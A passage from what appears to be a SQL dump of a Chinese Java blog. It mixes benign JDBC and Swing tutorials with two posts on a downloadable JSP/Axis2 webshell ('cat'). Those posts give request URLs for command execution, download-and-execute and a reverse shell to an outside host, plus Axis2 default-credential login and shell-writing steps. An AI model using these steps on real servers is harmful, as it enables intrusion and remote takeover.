0; i &lt; prr.length; i++) {\n                pstt.setObject(i + 1, prr[i]);\n            }\n            rs = pstt.executeQuery();\n            cachedRowSetImpl.populate(rs);\n            return cachedRowSetImpl;\n        } catch (SQLException e) {\n            throw e;\n        } finally {\n            if (pstt != null) {\n                pstt.close();\n            }\n            if (rs != null) {\n                rs.close();\n            }\n        }\n    }\n\n    /**\n     * 执行任意的SQL更新语句并影响行数\n     *\n     * @param connection 一个已打开的JDBC 连接\n     * @param sql        需要执行的SQL语句\n     * @param prr        SQL语句中参数预编译\n     * @return i SQL更新后的影响行数\n     * @throws SQLException\n     */\n    public static int executUpdate(Connection connection, String sql, Object... prr) throws SQLException {\n        PreparedStatement pstt = null;\n        try {\n            pstt = connection.prepareStatement(sql);\n            for (int i = 0; i &lt; prr.length; i++) {\n                pstt.setObject(i + 1, prr[i]);\n            }\n            return pstt.executeUpdate();\n        } catch (SQLException e) {\n            throw e;\n        } finally {\n            if (pstt != null) {\n                pstt.close();\n            }\n        }\n    }\n\n    /**\n     * 批量执行任意的SQL更新语句并影响行数数组,执行后会清空传入的参数List对象\n     *\n     * @param connection 一个已打开的JDBC 连接\n     * @param sql        需要执行的SQL语句\n     * @param parameters SQL语句中参数预编译\n     * @return\n     * @throws SQLException\n     */\n    public static int[] executBatchUpdate(Connection connection, String sql, List&lt;Object[]&gt; parameters) throws SQLException {\n        PreparedStatement pstt = null;\n        try {\n            pstt = connection.prepareStatement(sql);\n            for (Iterator&lt;Object[]&gt; it = parameters.iterator(); it.hasNext(); ) {\n                Object[] parameter = it.next();\n                for (int i = 0; i &lt; parameter.length; i++) {\n                    pstt.setObject(i + 1, parameter[i]);\n                }\n                pstt.addBatch();\n                it.remove();\n            }\n            return pstt.executeBatch();\n        } catch (SQLException e) {\n            throw e;\n        } finally {\n            if (pstt != null) {\n                pstt.close();\n            }\n        }\n    }\n\n}\n</pre>\n<br />\n</pre>\n<p class=\"p1\">\n    <strong>IncorrectResultSizeDataAccessException.java:</strong>\n</p>\n<p>\n<pre class=\"brush: java; gutter: true\">/* \n * Copyright yz 2016-01-14  Email:admin@javaweb.org. \n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n *      http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\npackage org.javaweb.core.db;\n\nimport java.sql.SQLException;\n\n/**\n * SQL查询异常，查询结果数量与期待的查询结果数不一致\n *\n * @author yz\n */\npublic class IncorrectResultSizeDataAccessException extends SQLException {\n\n    private static final long serialVersionUID = -4579851381128020945L;\n\n    public IncorrectResultSizeDataAccessException(long size) {\n        super(\"Data access exception thrown when a result was not of the expected size,for example when expecting a single row but getting 0 or more than 1 rows.it\'s \" + size + \" rows.\");\n    }\n\n}\n</pre>\n</p>\n<p class=\"p1\">\n    <strong> Site.java:</strong> \n</p>\n<p>\n<pre class=\"brush: java; gutter: true\">package org.javaweb.core.db;\n\npublic class Site {\n\n    private int    id;\n\n    private int    nType;\n\n    private int    nCodePage;\n\n    private int    nFail;\n\n    private int    nAlexa;\n\n    private String siteUrl;\n\n    private String sitePass;\n\n    private String config;\n\n    private String ip;\n\n    private int    nScript;\n\n    private String accessTime;\n\n    private String note;\n\n    public int getId() {\n        return id;\n    }\n\n    public void setId(int id) {\n        this.id = id;\n    }\n\n    public int getnType() {\n        return nType;\n    }\n\n    public void setnType(int nType) {\n        this.nType = nType;\n    }\n\n    public int getnCodePage() {\n        return nCodePage;\n    }\n\n    public void setnCodePage(int nCodePage) {\n        this.nCodePage = nCodePage;\n    }\n\n    public int getnFail() {\n        return nFail;\n    }\n\n    public void setnFail(int nFail) {\n        this.nFail = nFail;\n    }\n\n    public int getnAlexa() {\n        return nAlexa;\n    }\n\n    public void setnAlexa(int nAlexa) {\n        this.nAlexa = nAlexa;\n    }\n\n    public String getSiteUrl() {\n        return siteUrl;\n    }\n\n    public void setSiteUrl(String siteUrl) {\n        this.siteUrl = siteUrl;\n    }\n\n    public String getSitePass() {\n        return sitePass;\n    }\n\n    public void setSitePass(String sitePass) {\n        this.sitePass = sitePass;\n    }\n\n    public String getConfig() {\n        return config;\n    }\n\n    public void setConfig(String config) {\n        this.config = config;\n    }\n\n    public String getIp() {\n        return ip;\n    }\n\n    public void setIp(String ip) {\n        this.ip = ip;\n    }\n\n    public int getnScript() {\n        return nScript;\n    }\n\n    public void setnScript(int nScript) {\n        this.nScript = nScript;\n    }\n\n    public String getAccessTime() {\n        return accessTime;\n    }\n\n    public void setAccessTime(String accessTime) {\n        this.accessTime = accessTime;\n    }\n\n    public String getNote() {\n        return note;\n    }\n\n    public void setNote(String note) {\n        this.note = note;\n    }\n}</pre>\n</p>\n<p>\n    <br />\n</p>', null, '2014-10-07 12:55:15', '1', '606', null, '4', '2014-11-01 19:14:01'), ('1512', '1', '27', 'JavaSwing 简单模拟Mac Finder', '园长', '为了方便切换，我把Panel和JFrame分开了。之前画了个用的Netbeans，但是感觉毕竟没有手写的方便扩展。\n<p><strong>NetBeans画的：</strong></p>\n<p><a href=\"http://javaweb.org/wp-content/uploads/2014/10/2.jpg\"><img class=\"alignnone size-full wp-image-1514\" src=\"http://javaweb.org/wp-content/uploads/2014/10/2.jpg\" alt=\"2\" width=\"980\" height=\"632\" /></a></p>\n<p>代码写的：</p>\n<p><img class=\"alignnone size-full wp-image-1513\" src=\"http://javaweb.org/wp-content/uploads/2014/10/1.jpg\" alt=\"1\" width=\"990\" height=\"622\" /></p>\n<p>MainFrame.java：</p>\n<pre class=\"brush: java; gutter: true\">package org.javaweb.burp.test;\nimport java.awt.Dimension;\nimport javax.swing.JFrame;\n/**\n *\n * @author yz\n */\npublic class MainFrame extends JFrame {\n    private static final long serialVersionUID = 1L;\n    public MainFrame() {\n        initComponents();\n    }\n    private void initComponents() {\n        setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);\n        this.setTitle(&quot;测试&quot;);\n        this.add(new ApplicationPanel());\n        int screenWidth = java.awt.Toolkit.getDefaultToolkit().getScreenSize().width;\n        int screenHeight = java.awt.Toolkit.getDefaultToolkit().getScreenSize().height;\n        Dimension d = this.getPreferredSize();\n        this.setBounds(screenWidth / 2 - (d.width / 2), screenHeight / 2 - (d.height / 2), d.width, d.height);\n        pack();\n    }\n    public static void main(String[] args) {\n        java.awt.EventQueue.invokeLater(new Runnable() {\n            @Override\n            public void run() {\n                new MainFrame().setVisible(true);\n            }\n        });\n    }\n}</pre>\n<p><p class=\"p1\"><strong><span class=\"s1\">ApplicationPanel.java:</span></strong></p></p>\n<pre class=\"brush: java; gutter: true\">package org.javaweb.burp.test;\nimport java.awt.Color;\nimport javax.swing.GroupLayout;\nimport javax.swing.ImageIcon;\nimport javax.swing.JLabel;\n/**\n *\n * @author yz\n */\npublic class ApplicationPanel extends javax.swing.JPanel {\n    /**\n     * Creates new form ApplicationPanel\n     */\n    public ApplicationPanel() {\n        initComponents();\n    }\n    // &lt;editor-fold defaultstate=&quot;collapsed&quot; desc=&quot;Generated Code&quot;&gt;                          \n    private void initComponents() {\n        jSplitPane1 = new javax.swing.JSplitPane();\n        jPanel1 = new javax.swing.JPanel();\n        jScrollPane1 = new javax.swing.JScrollPane();\n        jPanel3 = new javax.swing.JPanel();\n        jPanel2 = new javax.swing.JPanel();\n        jPanel1.setMinimumSize(new java.awt.Dimension(200, 100));\n        javax.swing.GroupLayout jPanel3Layout = new javax.swing.GroupLayout(jPanel3);\n        jPanel3.setLayout(jPanel3Layout);\n        jPanel3Layout.setHorizontalGroup(\n            jPanel3Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n            .addGap(0, 196, Short.MAX_VALUE)\n        );\n        jPanel3Layout.setVerticalGroup(\n            jPanel3Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n            .addGap(0, 592, Short.MAX_VALUE)\n        );\n        jScrollPane1.setViewportView(jPanel3);\n        javax.swing.GroupLayout jPanel1Layout = new javax.swing.GroupLayout(jPanel1);\n        jPanel1.setLayout(jPanel1Layout);\n        jPanel1Layout.setHorizontalGroup(\n            jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n            .addComponent(jScrollPane1, javax.swing.GroupLayout.DEFAULT_SIZE, 200, Short.MAX_VALUE)\n        );\n        jPanel1Layout.setVerticalGroup(\n            jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n            .addComponent(jScrollPane1, javax.swing.GroupLayout.DEFAULT_SIZE, 596, Short.MAX_VALUE)\n        );\n        jSplitPane1.setLeftComponent(jPanel1);\n        javax.swing.GroupLayout jPanel2Layout = new javax.swing.GroupLayout(jPanel2);\n        jPanel2.setLayout(jPanel2Layout);\n        jPanel2Layout.setHorizontalGroup(\n            jPanel2Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n            .addGap(0, 777, Short.MAX_VALUE)\n        );\n        jPanel2Layout.setVerticalGroup(\n            jPanel2Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n            .addGap(0, 596, Short.MAX_VALUE)\n        );\n        jSplitPane1.setRightComponent(jPanel2);\n        javax.swing.GroupLayout layout = new javax.swing.GroupLayout(this);\n        this.setLayout(layout);\n        layout.setHorizontalGroup(\n            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n            .addComponent(jSplitPane1)\n        );\n        layout.setVerticalGroup(\n            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n            .addComponent(jSplitPane1)\n        );\n        initPanel();\n    }// &lt;/editor-fold&gt;                        \n    private void initPanel() {\n        JLabel jLabel1 = new JLabel(&quot;主页&quot;, new ImageIcon(this.getClass().getClassLoader().getResource(&quot;images/menu_bar_home_icon.png&quot;)), JLabel.LEFT);\n        JLabel jLabel2 = new JLabel(&quot;我的应用&quot;, new ImageIcon(this.getClass().getClassLoader().getResource(&quot;images/menu_bar_app_icon.png&quot;)), JLabel.LEFT);\n        JLabel jLabel3 = new JLabel(&quot;任务列表&quot;, new ImageIcon(this.getClass().getClassLoader().getResource(&quot;images/menu_bar_file_icon.png&quot;)), JLabel.LEFT);\n        final JLabel[] jLabelArray = new JLabel[]{jLabel1, jLabel2, jLabel3};\n        javax.swing.GroupLayout jPanel3Layout = new javax.swing.GroupLayout(jPanel3);\n        jPanel3.setLayout(jPanel3Layout);\n        //水平组\n        GroupLayout.SequentialGroup horizontalGroup = jPanel3Layout.createSequentialGroup();\n        //垂直租\n        GroupLayout.SequentialGroup verticalGroup = jPanel3Layout.createSequentialGroup();\n        horizontalGroup.addGap(10);//设置水平间距\n        GroupLayout.ParallelGroup pg = jPanel3Layout.createParallelGroup();\n        for (final JLabel jLabel : jLabelArray) {\n            jLabel.setOpaque(true);//设置为不透明\n            jLabel.setBackground(null);//默认去掉背景\n            jLabel.addMouseListener(new java.awt.event.MouseAdapter() {\n                @Override\n                public void mouseClicked(java.awt.event.MouseEvent evt) {\n                    //设置边框\n                    for (JLabel jLabel2 : jLabelArray) {\n                        if (jLabel == jLabel2) {\n                            jLabel2.setBackground(new Color(204, 204, 204));\n                        } else {\n                            jLabel2.setBackground(null);\n                        }\n                    }\n                }\n            });\n            pg.addComponent(jLabel, javax.swing.GroupLayout.PREFERRED_SIZE, 170, javax.swing.GroupLayout.PREFERRED_SIZE);\n            verticalGroup.addGap(5);//设置垂直间隔\n            verticalGroup.addGroup(jPanel3Layout.createParallelGroup().addComponent(jLabel, javax.swing.GroupLayout.PREFERRED_SIZE, 30, javax.swing.GroupLayout.PREFERRED_SIZE));\n        }\n        horizontalGroup.addGroup(pg);\n        jPanel3Layout.setHorizontalGroup(horizontalGroup);\n        jPanel3Layout.setVerticalGroup(verticalGroup);\n    }\n    // Variables declaration - do not modify                     \n    private javax.swing.JPanel jPanel1;\n    private javax.swing.JPanel jPanel2;\n    private javax.swing.JPanel jPanel3;\n    private javax.swing.JScrollPane jScrollPane1;\n    private javax.swing.JSplitPane jSplitPane1;\n    // End of variables declaration                   \n}</pre>\n<p>代码中用到的三张小图：</p>\n<p><a href=\"http://javaweb.org/wp-content/uploads/2014/10/menu_bar_app_icon.png\"><img class=\"alignnone size-full wp-image-1515\" src=\"http://javaweb.org/wp-content/uploads/2014/10/menu_bar_app_icon.png\" alt=\"menu_bar_app_icon\" width=\"20\" height=\"20\" /></a> <a href=\"http://javaweb.org/wp-content/uploads/2014/10/menu_bar_file_icon.png\"><img class=\"alignnone size-full wp-image-1516\" src=\"http://javaweb.org/wp-content/uploads/2014/10/menu_bar_file_icon.png\" alt=\"menu_bar_file_icon\" width=\"20\" height=\"20\" /></a> <a href=\"http://javaweb.org/wp-content/uploads/2014/10/menu_bar_home_icon.png\"><img class=\"alignnone size-full wp-image-1517\" src=\"http://javaweb.org/wp-content/uploads/2014/10/menu_bar_home_icon.png\" alt=\"menu_bar_home_icon\" width=\"20\" height=\"20\" /></a></p>\n<p>这几张图是我从Mac Finder上扣的有点搓，需要放到src/images目录下。</p>', null, '2014-10-10 10:48:55', '1', '732', null, '6', '2014-10-10 11:43:00'), ('1530', '1', '27', 'JavaSwing JComboBox模拟html的select标签', '园长', 'JComboBox默认不支持name属性设置，getSelectedItem()默认返回的是String。实际上可以模仿原生的DefaultComboBoxModel实现一个自己的DefaultComboBoxModel。\n<p><strong>DefaultComboBoxModel.java</strong></p>\n<pre class=\"brush: java; gutter: true\">package org.javaweb.swing.ui;\nimport java.util.Vector;\nimport javax.swing.AbstractListModel;\nimport javax.swing.ComboBoxModel;\n/**\n * 实现默认ComboBoxModel\n *\n * @author yz\n */\npublic class DefaultComboBoxModel extends AbstractListModel implements ComboBoxModel {\n    private Object selectedItem;\n    Vector&lt;JComboBoxItem&gt; objects;\n    public DefaultComboBoxModel(Vector&lt;JComboBoxItem&gt; objects) {\n        this.objects = objects;\n    }\n    @Override\n    public Object getSelectedItem() {\n        if (selectedItem != null) {\n            return selectedItem;\n        } else {\n            return objects.get(0).getValue();\n        }\n    }\n    @Override\n    public void setSelectedItem(Object newValue) {\n        selectedItem = newValue;\n    }\n    @Override\n    public int getSize() {\n        return objects.size();\n    }\n    @Override\n    public Object getElementAt(int i) {\n        return objects.get(i);\n    }\n}</pre>\n<p>封装好了model对象，现在需要的是JComboBox的选中对象Item。我的想法是自己封装一个JComboBoxItem这样选中的时候返回JComboBoxItem对象。当DefaultComboBoxModel调用getSelectedItem的时候返回我们自己的JComboBox，再重写toString方法，这样可以按照自己的意愿只输出JComboBox的value。</p>\n<p><strong>JComboBoxItem.java</strong></p>\n<pre class=\"brush: java; gutter: true\">package org.javaweb.swing.ui;\n/**\n * JComboBox选择项，JComboBox选中时getSelectedItem默认实现返回的只是字符串 JComboBoxItem\n * 类可以提供key、value. 模拟HTML的select标签\n *\n * @author yz\n */\npublic class JComboBoxItem {\n    private String key;\n    private String value;\n    public JComboBoxItem(String key, String value) {\n        this.key = key;\n        this.value = value;\n    }\n    public String getKey() {\n        return key;\n    }\n    public void setKey(String key) {\n        this.key = key;\n    }\n    public String getValue() {\n        return value;\n    }\n    public void setValue(String value) {\n        this.value = value;\n    }\n    @Override\n    public String toString() {\n        return this.getValue();\n    }\n}</pre>\n<p>调用部分代码：</p>\n<pre class=\"brush: java; gutter: true\">List&lt;Type&gt; typeList = typeDAO.getTypeByParentId(0);\n        Vector&lt;JComboBoxItem&gt; ls = new Vector&lt;JComboBoxItem&gt;();\n        for(Type t:typeList){\n            ls.add(new JComboBoxItem(String.valueOf(t.getId()),t.getTypeName()));\n        }\n        jComboBox1 = new JComboBox(new DefaultComboBoxModel(ls));</pre>\n<p>点击事件后获取key value：</p>\n<pre class=\"brush: java; gutter: true\">private void jButton1ActionPerformed(java.awt.event.ActionEvent evt) {                                         \n        JComboBoxItem item = (JComboBoxItem) jComboBox1.getSelectedItem();\n        System.err.println(item.getKey() + &quot;:&quot; + item.getValue());\n    }</pre>\n<p>输出：10:New</p>', null, '2014-11-05 10:50:54', '1', '745', null, '1', '2014-11-05 10:50:54'), ('1533', '1', '12', 'cat小工具', '园长', '我觉得这都算不上什么webshell了，写这个只是为了简化一些操作。cat提供了简单的的文件遍历、管理、命令执行、反弹shell、文件下载、自动下载并执行这么几个小功能。\r\n<p>\r\n	web界面只是一个简单的文件目录浏览功能和文件下载功能：\r\n</p>\r\n<p>\r\n	<img class=\"alignnone size-full wp-image-1534\" src=\"http://javaweb.org/wp-content/uploads/2014/11/1.jpg\" alt=\"1\" width=\"1436\" height=\"761\" />\r\n</p>\r\n<p>\r\n	点击文件名可以编辑对应的文件，新建文件也可以在这里进行File地址写上需要编辑的文件绝对路径就行了：\r\n</p>\r\n<p>\r\n	<a href=\"http://javaweb.org/wp-content/uploads/2014/11/2.jpg\"><img class=\"alignnone size-full wp-image-1535\" src=\"http://javaweb.org/wp-content/uploads/2014/11/2.jpg\" alt=\"2\" width=\"890\" height=\"759\" /></a>\r\n</p>\r\n<p>\r\n	执行系统命令会比较麻烦，因为需要自己写参数了：\r\n</p>\r\n<p>\r\n	<a href=\"http://javaweb.org/wp-content/uploads/2014/11/3.jpg\"><img class=\"alignnone size-full wp-image-1536\" src=\"http://javaweb.org/wp-content/uploads/2014/11/3.jpg\" alt=\"3\" width=\"941\" height=\"815\" /></a>\r\n</p>\r\n<p>\r\n	请求：http://localhost:8080/Struts2/cat.jsp?action=exec&amp;cmd=ifconfig\r\n</p>\r\n<p>\r\n	参数:\r\n</p>\r\n<p>\r\n	action=exec\r\n</p>\r\n<p>\r\n	cmd=需要执行的命令。\r\n</p>\r\n<p>\r\n	文件下载分为远程文件下载和本地文件下载。本地文件下载直接点击下载即可从服务器上下载对应的文件。而远程文件下载的则需要继续以参数的方式请求：\r\n</p>\r\n<p>\r\n	<a href=\"http://javaweb.org/wp-content/uploads/2014/11/4.jpg\"><img class=\"alignnone size-full wp-image-1537\" src=\"http://javaweb.org/wp-content/uploads/2014/11/4.jpg\" alt=\"4\" width=\"932\" height=\"174\" /></a>\r\n</p>\r\n<p>\r\n	请求：http://localhost:8080/Struts2/cat.jsp?action=downloadL&amp;url=http://www.baidu.com/img/bdlogo.png&amp;path=bdlogo.png\r\n</p>\r\n<p>\r\n	参数：\r\n</p>\r\n<p>\r\n	action=downloadL\r\n</p>\r\n<p>\r\n	url=需要下载的文件的URL地址\r\n</p>\r\n<p>\r\n	path=文件保存的绝对路径，注意如果只写文件名会下载到当前运行环境的目录下(比如tomcat会下载到tomcat的bin目录)。\r\n</p>\r\n<p>\r\n	本地文件下载如遇到目录则自动打包成zip。\r\n</p>\r\n<p>\r\n	自动下载并执行，这个功能实际上是为了简化操作。下载某个文件然后可以用命令去调用它。这个命令如果能正常执行完是会有回显的。并且下载的文件会在命令执行结束后自动删除掉。\r\n</p>\r\n<p>\r\n	<a href=\"http://javaweb.org/wp-content/uploads/2014/11/5.jpg\"><img class=\"alignnone size-full wp-image-1538\" src=\"http://javaweb.org/wp-content/uploads/2014/11/5.jpg\" alt=\"5\" width=\"1119\" height=\"601\" /></a>\r\n</p>\r\n<p>\r\n	请求：http://localhost:8080/Struts2/cat.jsp?action=auto&amp;url=http://www.baidu.com/img/bdlogo.png&amp;fileName=bdlogo.png&amp;cmd=cat%20bdlogo.png\r\n</p>\r\n<p>\r\n	参数：\r\n</p>\r\n<p>\r\n	action=auto\r\n</p>\r\n<p>\r\n	url=需要下载的文件的URL地址\r\n</p>\r\n<p>\r\n	fileName=文件名\r\n</p>\r\n<p>\r\n	cmd=需要执行的系统命令\r\n</p>\r\n<p>\r\n	反弹shell，这里实现的仅仅是一个系统执行命令的入口反弹，而非反弹一个具体的文件流。即给远程监听的nc反弹一个能够执行命令的入口。\r\n</p>\r\n<p>\r\n	<a href=\"http://javaweb.org/wp-content/uploads/2014/11/6.jpg\"><img class=\"alignnone size-full wp-image-1539\" src=\"http://javaweb.org/wp-content/uploads/2014/11/6.jpg\" alt=\"6\" width=\"736\" height=\"587\" /></a>\r\n</p>\r\n<p>\r\n	请求：http://localhost:8080/Struts2/cat.jsp?action=shell&amp;host=p2j.cn&amp;port=9527\r\n</p>\r\n<p>\r\n	参数：\r\n</p>\r\n<p>\r\n	action=shell\r\n</p>\r\n<p>\r\n	host=远程IP\r\n</p>\r\n<p>\r\n	port=远程监听的端口\r\n</p>\r\n<p>\r\n	源码下载:<a href=\"http://pan.baidu.com/s/1hqmWGFM\">Cat</a><a class=\"ke-insertfile\" href=\"/uploads/file/20171207/20171207053147_737.zip\" target=\"_blank\">.zip</a>\r\n</p>\r\n<p>\r\n	其实重点根本就不是这个jsp文件，而是cat.jar。在后面会讲到怎么利用cat.jar做一些有趣的事。-:)\r\n</p>', null, '2014-11-05 23:58:37', '1', '907', null, '0', '2014-11-06 00:05:13'), ('1548', '1', '12', 'axis2 利用小工具cat.aar', '园长', 'Axis2：\r\n<p>\r\n	Web Service是现在最适合实现SOAP的技术，而Axis2是实现Web Service的一种技术框架（架构）。\r\n</p>\r\n<p>\r\n	昨天把把菜刀脚本打包发现&lt;&gt;在xml会被转义，导致菜刀客户端无法连接。看起来别人可以修改response类型，但是我没成功。利用之前发的Cat小工具打包成aar就可以玩了。\r\n</p>\r\n<p>\r\n	<a href=\"http://javaweb.org/wp-content/uploads/2014/11/13.jpg\"><img class=\"alignnone size-full wp-image-1553\" src=\"http://javaweb.org/wp-content/uploads/2014/11/13.jpg\" alt=\"1\" width=\"865\" height=\"708\" /></a>\r\n</p>\r\n<p>\r\n	axis2管理登陆默认配置了用户名为admin，密码axis2：\r\n</p>\r\n<p>\r\n	<a href=\"http://javaweb.org/wp-content/uploads/2014/11/22.jpg\"><img class=\"alignnone size-full wp-image-1554\" src=\"http://javaweb.org/wp-content/uploads/2014/11/22.jpg\" alt=\"2\" width=\"1049\" height=\"647\" /></a>\r\n</p>\r\n<p>\r\n	<img class=\"alignnone size-full wp-image-1555\" src=\"http://javaweb.org/wp-content/uploads/2014/11/32.jpg\" alt=\"3\" width=\"1029\" height=\"571\" />\r\n</p>\r\n<p>\r\n	axis2管理后台：\r\n</p>\r\n<p>\r\n	<a href=\"http://javaweb.org/wp-content/uploads/2014/11/51.jpg\"><img class=\"alignnone size-full wp-image-1557\" src=\"http://javaweb.org/wp-content/uploads/2014/11/51.jpg\" alt=\"5\" width=\"1004\" height=\"570\" /></a>\r\n</p>\r\n<p>\r\n	想要deploy 自己的应用需要先打成对应的aar、jar包。用eclipse安装axis2插件。\r\n</p>\r\n<p>\r\n	<a href=\"https://axis.apache.org/axis2/java/core/tools/eclipse/servicearchiver-plugin.html\">Service Archive Wizard - Eclipse Plug-in</a> 、<a href=\"https://axis.apache.org/axis2/java/core/tools/eclipse/wsdl2java-plugin.html\">Code Generator Wizard - Eclipse Plug-in</a>\r\n</p>\r\n<p>\r\n	下载地址：https://axis.apache.org/axis2/java/core/tools/index.html\r\n</p>\r\n<p>\r\n	下载完成后直接把对应的jar丢到eclipse的dropins目录就行了。\r\n</p>\r\n<p>\r\n	新建一个java项目，写好相关脚本。\r\n</p>\r\n<p>\r\n	<a href=\"http://javaweb.org/wp-content/uploads/2014/11/131.jpg\"><img class=\"alignnone size-full wp-image-1565\" src=\"http://javaweb.org/wp-content/uploads/2014/11/131.jpg\" alt=\"13\" width=\"1011\" height=\"562\" /></a>\r\n</p>\r\n<p>\r\n	<strong>导出aar：</strong>\r\n</p>\r\n<p>\r\n	安装完成后新建Axis2 service Archiver项目，当然可以根据自己的需求可以利用Axis2 code generator生成wsdl文件。\r\n</p>\r\n<p>\r\n	<img class=\"alignnone size-full wp-image-1552\" src=\"http://javaweb.org/wp-content/uploads/2014/11/41.jpg\" alt=\"4\" width=\"525\" height=\"500\" />\r\n</p>\r\n<p>\r\n	指定class file为此项目编译目录。\r\n</p>\r\n<p>\r\n	<a href=\"http://javaweb.org/wp-content/uploads/2014/11/61.jpg\"><img class=\"alignnone size-full wp-image-1558\" src=\"http://javaweb.org/wp-content/uploads/2014/11/61.jpg\" alt=\"6\" width=\"516\" height=\"598\" /></a>\r\n</p>\r\n<p>\r\n	wsdl可以自动生成或者load已生成的wadl文件，可以跳过。Add any external libraries不用继续跳过。service.xml也自动生成接这继续跳到下一步。\r\n</p>\r\n<p>\r\n	Generate the Service XML file:\r\n</p>\r\n<p>\r\n	<a href=\"http://javaweb.org/wp-content/uploads/2014/11/7.jpg\"><img class=\"alignnone size-full wp-image-1559\" src=\"http://javaweb.org/wp-content/uploads/2014/11/7.jpg\" alt=\"7\" width=\"516\" height=\"598\" /></a>\r\n</p>\r\n<p>\r\n	选中可供外部调用的类方法。service name用于部署成功后访问。最后一步写上aar名字和位置就可以生成成功了。\r\n</p>\r\n<p>\r\n	然后继续回到后台deploy Cat.arr：<span style=\"color:green;\">File Cat.aar successfully uploaded </span>\r\n</p>\r\n<p>\r\n	部署成功后切到：Available Services(可用的services)。\r\n</p>\r\n<p>\r\n	<a href=\"http://javaweb.org/wp-content/uploads/2014/11/8.jpg\"><img class=\"alignnone size-full wp-image-1560\" src=\"http://javaweb.org/wp-content/uploads/2014/11/8.jpg\" alt=\"8\" width=\"697\" height=\"580\" /></a>\r\n</p>\r\n<p>\r\n	访问：http://localhost:8080/axis2/services/Cat?wsdl 可看到所有可被调用的方法名和具体的参数以及返回值类型：\r\n</p>\r\n<p>\r\n	<a href=\"http://javaweb.org/wp-content/uploads/2014/11/9.jpg\"><img class=\"alignnone size-full wp-image-1561\" src=\"http://javaweb.org/wp-content/uploads/2014/11/9.jpg\" alt=\"9\" width=\"843\" height=\"716\" /></a>\r\n</p>\r\n<p>\r\n	比如调用Cat里面的getClassPathResponse这个方法，会返回了当前的classpath。\r\n</p>\r\n<p>\r\n	<a href=\"http://javaweb.org/wp-content/uploads/2014/11/10.jpg\"><img class=\"alignnone size-full wp-image-1562\" src=\"http://javaweb.org/wp-content/uploads/2014/11/10.jpg\" alt=\"10\" width=\"654\" height=\"296\" /></a>\r\n</p>\r\n<p>\r\n	往axis2目录写shell:&nbsp;http://localhost:8080/axis2/services/Cat/writeStringToFile?data=test&amp;file=/Users/yz/Documents/install/apache-tomcat-7.0.56/webapps/axis2/1.jsp&amp;encoding=utf-8&amp;append=false\r\n</p>\r\n<p>\r\n	<a href=\"http://javaweb.org/wp-content/uploads/2014/11/111.jpg\"><img class=\"alignnone size-full wp-image-1563\" src=\"http://javaweb.org/wp-content/uploads/2014/11/111.jpg\" alt=\"11\" width=\"1003\" height=\"253\" /></a>执行命令: http://localhost:8080/axis2/services/Cat/exec?cmd=whoami\r\n</p>\r\n<p>\r\n	<a href=\"http://javaweb.org/wp-content/uploads/2014/11/121.jpg\"><img class=\"alignnone size-full wp-image-1564\" src=\"http://javaweb.org/wp-content/uploads/2014/11/121.jpg\" alt=\"12\" width=\"483\" height=\"273\" /></a>\r\n</p>\r\n<p>\r\n	反弹Shell:&nbsp;http://localhost:8080/axis2/services/Cat/shell?host=p2j.cn&amp;port=9527\r\n</p>\r\n<p>\r\n	<a href=\"http://javaweb.org/wp-content/uploads/2014/11/14.jpg\"><img class=\"alignnone size-full wp-image-1566\" src=\"http://javaweb.org/wp-content/uploads/2014/11/14.jpg\" alt=\"14\" width=\"748\" height=\"251\" /></a>\r\n</p>\r\n<p>\r\n	其他功能(文件下载等)请参考：<a href=\"http://javaweb.org/?p=1533\">cat小工具</a>，测试完成记得在Available Services 卸载(Remove Service)对应的Service.\r\n</p>\r\n<p>\r\n	下载地址：<a href=\"/uploads/file/20170801/20170801101758_797.zip\">axis2 利用小工具cat.aar.zip</a>\r\n</p>', null, '2014-11-12 16:02:44', '1', '1519', null, '2', '2014-11-12 16:27:25'), ('1575', '1', '14', 'BurpSuite 扩展开发[1]-API与HelloWold', '园长', '<h1>0x00 简介</h1>\n<p><hr /></p>\n<p>BurpSuite神器这些年非常的受大家欢迎，在国庆期间解了下Burp相关开发并写了这篇笔记。希望和大家分享一下JavaSwing和Burp插件相关开发。第一节仅简单的了解下API相关，后面会带着大家利用Netbeans开发我们自己的扩展以及各种有趣的小工具。</p>\n<p><h1>0x01 怎么学？</h1></p>\n<p><hr /></p>\n<p>第一个问题是我们应该怎么去写自己的Burp扩展？我们可以找一些现有的扩展学习下，或者参阅官方文档或者手册，其次才是google一下是否有相关的教程、文章进行学习。</p>\n<p>google搜索：burp suite api，找到官方的API相关说明。</p>\n<p><ol></p>\n<p>	<li>http://portswigger.net/burp/extender/</li></p>\n<p>	<li>http://blog.portswigger.net/2012/12/draft-new-extensibility-api.html</li></p>\n<p></ol></p>\n<p><a href=\"http://javaweb.org/wp-content/uploads/2014/11/15.jpg\"><img class=\"alignnone size-full wp-image-1576\" src=\"http://javaweb.org/wp-content/uploads/2014/11/15.jpg\" alt=\"1\" width=\"626\" height=\"663\" /></a></p>\n<p>You can:</p>\n<p><ol></p>\n<p>	<li>执行和修改 HTTP 请求和响应</li></p>\n<p>	<li>访问运行时的数据，比如：代理日志、目标站map和扫描问题</li></p>\n<p>	<li>启动自己的action，如扫描和网站爬行</li></p>\n<p>	<li>自定义扫描检测和注册扫描问题</li></p>\n<p>	<li>提供自定义Intruder payloads和payload处理</li></p>\n<p>	<li>查询和更新Suite-wide的目标作用域</li></p>\n<p>	<li>查询和更新session处理cookie jar</li></p>\n<p>	<li>实现自定义session处理action</li></p>\n<p>	<li>添加自定义的标签(tabs)和上下文菜单项到Burp 用户界面</li></p>\n<p>	<li>可使用自己的界面添加Burp的HTTP消息编辑器</li></p>\n<p>	